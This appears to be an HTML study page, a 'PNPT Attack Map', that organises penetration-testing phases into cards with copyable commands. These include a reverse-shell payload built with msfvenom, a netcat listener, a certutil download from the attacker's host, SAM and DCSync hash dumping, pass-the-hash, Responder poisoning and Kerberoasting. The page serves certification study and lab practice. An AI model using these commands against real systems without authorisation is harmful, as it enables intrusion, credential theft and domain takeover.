@@ -1,0 +1,275 @@
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>PNPT Attack Map</title>
+<style>
+  /* Layout: a searchable vertical spine of 11 phase cards, grouped by stage, each expandable to key moves + commands. Dark-first terminal identity, group-colored. */
+  :root{
+    --bg:#0e141b; --panel:#161f2b; --panel-2:#1c2838; --line:#263447;
+    --fg:#e7eef6; --muted:#8aa0b6; --faint:#60748c;
+    --accent:#35d6a6;
+    --g-ext:#35d6a6;   /* external */
+    --g-priv:#f2b347;  /* privesc */
+    --g-int:#8b7cf0;   /* internal/AD */
+    --g-rep:#f2778f;   /* report */
+    --warn-bg:#2a2314; --warn-fg:#f2c14e; --warn-bar:#d99a2b;
+    --chip-bg:#1d2a3a;
+    --radius:14px;
+    --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:"IBM Plex Sans",system-ui,-apple-system,sans-serif;
+    color-scheme:dark;
+  }
+  :root:not([data-theme="dark"]){}
+  @media (prefers-color-scheme:light){
+    :root:not([data-theme="dark"]){
+      --bg:#f4f7fa; --panel:#ffffff; --panel-2:#f0f4f8; --line:#d8e1ea;
+      --fg:#17222e; --muted:#54657a; --faint:#8295a8;
+      --accent:#0f9e78;
+      --g-ext:#0f9e78; --g-priv:#b9791a; --g-int:#5a4bc4; --g-rep:#c74e68;
+      --warn-bg:#fdf3dc; --warn-fg:#8a5a12; --warn-bar:#e0a53a;
+      --chip-bg:#eef3f8;
+      color-scheme:light;
+    }
+  }
+  :root[data-theme="light"]{
+    --bg:#f4f7fa; --panel:#ffffff; --panel-2:#f0f4f8; --line:#d8e1ea;
+    --fg:#17222e; --muted:#54657a; --faint:#8295a8;
+    --accent:#0f9e78;
+    --g-ext:#0f9e78; --g-priv:#b9791a; --g-int:#5a4bc4; --g-rep:#c74e68;
+    --warn-bg:#fdf3dc; --warn-fg:#8a5a12; --warn-bar:#e0a53a;
+    --chip-bg:#eef3f8;
+    color-scheme:light;
+  }
+  *{box-sizing:border-box}
+  body{background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.5;margin:0}
+  .wrap{max-width:860px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:0}
+
+  header{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:var(--bg);border-bottom:1px solid var(--line)}
+  body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:21;background:var(--bg)}
+  .head-inner{max-width:860px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:14px}
+  .brand{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+  h1{font-family:var(--mono);font-size:1.25rem;font-weight:600;margin:0;letter-spacing:-.01em}
+  .by{font-size:.72rem;color:var(--faint);font-family:var(--mono)}
+  .tag{color:var(--accent)}
+  .controls{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;align-items:center}
+  #q{flex:1;min-width:0;background:var(--panel);border:1px solid var(--line);color:var(--fg);
+     font-family:var(--mono);font-size:.9rem;padding:9px 12px;border-radius:10px}
+  #q::placeholder{color:var(--faint)}
+  #q:focus{outline:2px solid var(--accent);outline-offset:1px}
+  .btn{background:var(--panel);border:1px solid var(--line);color:var(--muted);font-family:var(--mono);
+       font-size:.8rem;padding:9px 12px;border-radius:10px;cursor:pointer;white-space:nowrap}
+  .btn:hover{color:var(--fg);border-color:var(--accent)}
+  .btn:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+
+  main{padding-block:18px 48px}
+  .grouplbl{font-family:var(--mono);font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;
+            color:var(--faint);margin:22px 4px 10px;display:flex;align-items:center;gap:8px}
+  .grouplbl::before{content:"";width:9px;height:9px;border-radius:50%;background:var(--gc)}
+
+  .phase{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--gc);
+         border-radius:var(--radius);margin:10px 0;overflow:hidden}
+  .phase.hidden{display:none}
+  .phead{display:flex;align-items:center;gap:12px;padding:14px 16px;cursor:pointer;user-select:none}
+  .phead:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+  .num{flex:none;width:30px;height:30px;border-radius:8px;background:var(--panel-2);color:var(--gc);
+       font-family:var(--mono);font-weight:600;font-size:.9rem;display:flex;align-items:center;justify-content:center}
+  .pttl{flex:1;min-width:0}
+  .pttl .nm{font-weight:600;font-size:1rem}
+  .pttl .goal{color:var(--muted);font-size:.84rem;margin-top:1px}
+  .chev{flex:none;color:var(--faint);transition:transform .18s ease;font-family:var(--mono)}
+  .phase.open .chev{transform:rotate(90deg)}
+
+  .body{border-top:1px solid var(--line);padding:4px 16px 16px;display:none}
+  .phase.open .body{display:block}
+  .seclbl{font-family:var(--mono);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;
+          color:var(--faint);margin:14px 0 6px}
+  ul.moves{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:5px}
+  ul.moves li{position:relative;padding-left:16px;font-size:.9rem;color:var(--fg)}
+  ul.moves li::before{content:"▸";position:absolute;left:0;color:var(--gc);font-size:.8rem}
+  ul.moves li b{color:var(--gc);font-weight:600}
+
+  .cmd{position:relative;background:var(--panel-2);border:1px solid var(--line);border-left:3px solid var(--gc);
+       border-radius:8px;margin:6px 0;overflow-x:auto}
+  .cmd code{display:block;font-family:var(--mono);font-size:.82rem;color:var(--fg);padding:9px 40px 9px 12px;white-space:pre}
+  .cmd .cmt{color:var(--faint)}
+  .copy{position:absolute;top:6px;right:6px;background:transparent;border:1px solid var(--line);color:var(--faint);
+        font-family:var(--mono);font-size:.68rem;padding:2px 7px;border-radius:6px;cursor:pointer}
+  .copy:hover{color:var(--fg);border-color:var(--gc)}
+  .copy.ok{color:var(--accent);border-color:var(--accent)}
+
+  .warn{background:var(--warn-bg);border:1px solid var(--warn-bar);border-left:3px solid var(--warn-bar);
+        border-radius:8px;padding:8px 11px;margin:8px 0;font-size:.82rem;color:var(--warn-fg)}
+  .warn b{font-weight:600}
+
+  .nores{display:none;text-align:center;color:var(--muted);font-family:var(--mono);padding:40px 0}
+  .nores.show{display:block}
+
+  footer{border-top:1px solid var(--line);color:var(--faint);font-family:var(--mono);font-size:.75rem;
+         padding-block:18px 8px;line-height:1.7}
+  @media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<header>
+  <div class="head-inner">
+    <div class="brand">
+      <h1>PNPT <span class="tag">Attack Map</span></h1>
+      <span class="by">// Red</span>
+    </div>
+    <div class="controls">
+      <input id="q" type="text" placeholder="search a phase, tool, or command…  (try 'hash', 'pivot', 'nmap')" autocomplete="off" aria-label="Search">
+      <button class="btn" id="expand">expand all</button>
+      <button class="btn" id="collapse">collapse all</button>
+      <button class="btn" id="theme" title="toggle theme">◐</button>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="wrap" id="list"></div>
+  <div class="wrap nores" id="nores">no match — try a simpler word</div>
+  <div class="wrap">
+    <footer>
+      OSINT → scan → foothold → privesc → loot → pivot → AD → Domain Admin → report<br>
+      tap a phase to open it · click a command to copy · the goal is to need this less each week
+    </footer>
+  </div>
+</main>
+
+<script>
+const DATA = [
+  {group:"External — get a foothold", gc:"--g-ext", phases:[
+    {n:1, nm:"OSINT", goal:"Learn the target before touching it",
+     moves:["Find domains, emails, employees, tech stack","Build a <b>username list</b> for spraying later"],
+     cmds:["whois DOMAIN.com","theHarvester -d DOMAIN.com -b all","sublist3r -d DOMAIN.com  # subdomains"] },
+    {n:2, nm:"Scan & Enumerate", goal:"Find open ports and services",
+     moves:["Full port scan, then version/script on what's open","Enumerate SMB, web, FTP, SMTP"],
+     cmds:["nmap -Pn -p- -T4 TARGET -oA scan","nmap -Pn -sV -sC -p <ports> TARGET","smbclient -L //TARGET -N  # null session"],
+     warn:"Windows blocks ping — a 'host seems down' = use <b>-Pn</b>, not a dead box." },
+    {n:3, nm:"Web & Foothold", goal:"Break in → land a (weak) shell",
+     moves:["Dir-bust, fingerprint, hunt the usual bugs","Default creds · SQLi · upload · LFI · command inj · known CVE"],
+     cmds:["gobuster dir -u http://TARGET -w common.txt -x php,txt","searchsploit <software> <version>","sqlmap -u 'http://TARGET/p?id=1' --batch --dbs"],
+     warn:"PNPT caps Metasploit auto-exploit at <b>ONE</b> use — do the rest manually." },
+  ]},
+  {group:"Privilege Escalation — own the box", gc:"--g-priv", phases:[
+    {n:4, nm:"Linux PrivEsc", goal:"Weak user → root",
+     moves:["Enumerate first, read the output","Exploit what you find (GTFOBins)"],
+     cmds:["id ; sudo -l ; uname -a","find / -perm -4000 2>/dev/null  # SUID","cat /etc/crontab  # cron","# sudo binary→gtfobins · SUID bash→bash -p\n# writable passwd/shadow · cron/wildcard"],
+     warn:"Payload goes <b>INSIDE</b> the file (nano). The echo|sudo tee runs <b>AT</b> the terminal ($)." },
+    {n:5, nm:"Windows PrivEsc", goal:"Weak user → SYSTEM",
+     moves:["Enumerate: <b>whoami /priv</b> + services + winPEAS","Doors = misconfigs · Badges = token privs"],
+     cmds:["whoami /priv  # SeImpersonate = Potato→SYSTEM","accesschk.exe /accepteula -uwcqv USER *","# service perms→sc config binpath\n# AutoRuns · AlwaysInstallElevated · saved creds"],
+     warn:"SeImpersonate in the list → <b>Potato → SYSTEM</b> (GodPotato / PrintSpoofer)." },
+  ]},
+  {group:"Internal — loot, pivot, take the domain", gc:"--g-int", phases:[
+    {n:6, nm:"Credential Access", goal:"Grab hashes, reuse them",
+     moves:["Dump SAM — need <b>SAM + SYSTEM</b> together","Crack the NT hash, or Pass-the-Hash"],
+     cmds:["reg save HKLM\\SAM sam.bak & reg save HKLM\\SYSTEM system.bak","secretsdump.py -sam sam.bak -system system.bak LOCAL","hashcat -m 1000 <NThash> rockyou.txt","impacket-psexec -hashes :NTHASH administrator@TARGET"],
+     warn:"hashcat -m 1000 wants <b>ONLY the NT hash</b> (4th field). The aad3b435… LM part is dead." },
+    {n:7, nm:"Shells & File Transfer", goal:"Move tools in, loot out",
+     moves:["Build + catch a reverse shell (listener first!)","Server always runs on Kali; direction = who downloads"],
+     cmds:["msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o rev.exe","nc -nvlp 4444  # listener BEFORE firing","# Kali→Win:  python3 -m http.server 80  +  certutil -urlcache -split -f http://KALI/f C:\\f","# Win→Kali:  smbserver.py share . -smb2support -user red -password red  +  copy f \\\\KALI\\share\\"],
+     warn:"URL = forward <b>//</b> · Windows path = back <b>\\</b> ." },
+    {n:8, nm:"Active Directory", goal:"One user → Domain Admin",
+     moves:["Poison, map, spray, roast","LLMNR · Kerberoast · AS-REP · DCSync"],
+     cmds:["responder -I tun0 -dwPv  ;  hashcat -m 5600 hash.txt rockyou.txt","nxc ldap DOMAIN -u USER -p PASS --bloodhound --dns-server DC_IP -c all","impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request  # kerberoast -m 13100","impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP  # asrep -m 18200","impacket-secretsdump DOMAIN/USER:PASS@DC_IP  # DCSync all hashes"] },
+    {n:9, nm:"Pivoting", goal:"Reach machines you can't touch directly",
+     moves:["Check the owned host's networks first","Tunnel through it to the hidden subnet"],
+     cmds:["ipconfig  /  ip a  /  arp -a  # a 2nd subnet = pivot","ssh -D 9050 user@PIVOT_HOST  # SOCKS proxy","# /etc/proxychains.conf → socks4 127.0.0.1 9050","proxychains nmap -sT -Pn INTERNAL_IP"],
+     warn:"Check <b>ipconfig</b> early — do you even need to pivot?" },
+  ]},
+  {group:"Finish — prove it, write it", gc:"--g-rep", phases:[
+    {n:10, nm:"Post-Exploitation", goal:"Prove impact, collect evidence",
+     moves:["Dump all hashes, hunt sensitive files","Screenshot proof: whoami on each host, DA on the DC"],
+     cmds:["# hunt: *.kdbx *.config web.config unattend.xml .ssh/id_rsa *.bak bash_history","# note persistence for the report — don't leave it"] },
+    {n:11, nm:"Report & Debrief", goal:"The real PNPT test",
+     moves:["Each finding: <b>Finding → Impact → Remediation</b>","Prep the 15-min live debrief — explain calmly, out loud"],
+     cmds:["# Finding = what's wrong (exact location)\n# Impact = who exploits it → what they get → how far\n# Remediation = the concrete fix"],
+     warn:"The PNPT is passed by <b>explaining clearly</b>, not just hacking. Practice the debrief out loud." },
+  ]},
+];
+
+const esc = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+function cmdHtml(c){
+  // keep allowed <b> from moves out; commands are plain. Comment lines dimmed.
+  return esc(c).split("\n").map(line=>{
+    const t = line.replace(/(#.*)$/,'<span class="cmt">$1</span>');
+    return t;
+  }).join("\n");
+}
+
+const list = document.getElementById("list");
+DATA.forEach(group=>{
+  const gl = document.createElement("div");
+  gl.className="grouplbl"; gl.style.setProperty("--gc",`var(${group.gc})`);
+  gl.textContent=group.group;
+  list.appendChild(gl);
+  group.phases.forEach(p=>{
+    const card=document.createElement("section");
+    card.className="phase"; card.style.setProperty("--gc",`var(${group.gc})`);
+    const moves=p.moves.map(m=>`<li>${m}</li>`).join("");
+    const cmds=p.cmds.map(c=>`<div class="cmd"><button class="copy" type="button">copy</button><code>${cmdHtml(c)}</code></div>`).join("");
+    const warn=p.warn?`<div class="warn">⚠ ${p.warn}</div>`:"";
+    card.innerHTML=`
+      <div class="phead" role="button" tabindex="0" aria-expanded="false">
+        <div class="num">${p.n}</div>
+        <div class="pttl"><div class="nm">${p.nm}</div><div class="goal">${p.goal}</div></div>
+        <div class="chev">▸</div>
+      </div>
+      <div class="body">
+        <div class="seclbl">Key moves</div>
+        <ul class="moves">${moves}</ul>
+        <div class="seclbl">Commands</div>
+        ${cmds}
+        ${warn}
+      </div>`;
+    const searchText=(p.nm+" "+p.goal+" "+p.moves.join(" ")+" "+p.cmds.join(" ")+" "+(p.warn||"")).toLowerCase().replace(/<[^>]+>/g,"");
+    card.dataset.search=searchText;
+    const head=card.querySelector(".phead");
+    const toggle=()=>{const o=card.classList.toggle("open");head.setAttribute("aria-expanded",o)};
+    head.addEventListener("click",toggle);
+    head.addEventListener("keydown",e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();toggle()}});
+    list.appendChild(card);
+  });
+});
+
+// copy buttons
+list.addEventListener("click",e=>{
+  const b=e.target.closest(".copy"); if(!b) return;
+  e.stopPropagation();
+  const code=b.parentElement.querySelector("code").innerText;
+  navigator.clipboard?.writeText(code).then(()=>{
+    b.textContent="copied"; b.classList.add("ok");
+    setTimeout(()=>{b.textContent="copy";b.classList.remove("ok")},1200);
+  }).catch(()=>{
+    const r=document.createRange(); r.selectNodeContents(b.parentElement.querySelector("code"));
+    const s=getSelection(); s.removeAllRanges(); s.addRange(r);
+  });
+});
+
+// search
+const q=document.getElementById("q"), nores=document.getElementById("nores");
+q.addEventListener("input",()=>{
+  const term=q.value.trim().toLowerCase();
+  let any=false;
+  document.querySelectorAll(".phase").forEach(card=>{
+    const hit=!term||card.dataset.search.includes(term);
+    card.classList.toggle("hidden",!hit);
+    if(hit){any=true; if(term) card.classList.add("open"), card.querySelector(".phead").setAttribute("aria-expanded","true");}
+  });
+  document.querySelectorAll(".grouplbl").forEach(gl=>{
+    let sib=gl.nextElementSibling, show=false;
+    while(sib&&sib.classList.contains("phase")){ if(!sib.classList.contains("hidden"))show=true; sib=sib.nextElementSibling; }
+    gl.style.display=show?"":"none";
+  });
+  nores.classList.toggle("show",!any);
+});
+
+document.getElementById("expand").onclick=()=>document.querySelectorAll(".phase").forEach(c=>{c.classList.add("open");c.querySelector(".phead").setAttribute("aria-expanded","true")});
+document.getElementById("collapse").onclick=()=>document.querySelectorAll(".phase").forEach(c=>{c.classList.remove("open");c.querySelector(".phead").setAttribute("aria-expanded","false")});
+
+// theme toggle
+const root=document.documentElement;
+document.getElementById("theme").onclick=()=>{
+  const cur=root.getAttribute("data-theme");
+  const dark=cur?cur==="dark":matchMedia("(prefers-color-scheme:dark)").matches;
+  root.setAttribute("data-theme",dark?"light":"dark");
+};
+</script>
